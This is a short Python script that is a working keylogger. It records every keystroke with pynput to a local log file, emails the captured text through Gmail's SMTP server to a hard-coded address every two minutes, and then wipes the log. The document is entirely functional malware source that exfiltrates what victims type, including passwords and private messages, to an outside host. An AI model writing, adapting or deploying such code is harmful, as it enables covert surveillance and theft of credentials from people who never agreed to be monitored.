import subprocess, smtplib, threading
from pynput.keyboard import Key, Listener

sender_email = "sender-example@gmail.com"
sender_password = "12345678"
receiver_email = "example@gmail.com"
open("log.txt", "a").close()

def logging(key):
    try:
        log = key.char
    except AttributeError:
        if key == Key.space:
            log = ' '
        elif key == Key.enter:
            log = '\n'
        elif key == Key.tab:
            log = '\t'
        else:
            log = f' [{key.name}] '

    with open("log.txt", "a") as f:
        f.write(log)


def send_mail():
    with open("log.txt", "r") as file:
        log_data = file.read()
        
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, log_data)
        

    # clear the file after sending the email
    with open("log.txt", "w") as file:
        file.write("")
    
    threading.Timer(120, send_mail).start()
    
send_mail()

with Listener(on_press=logging) as listener:
    listener.join()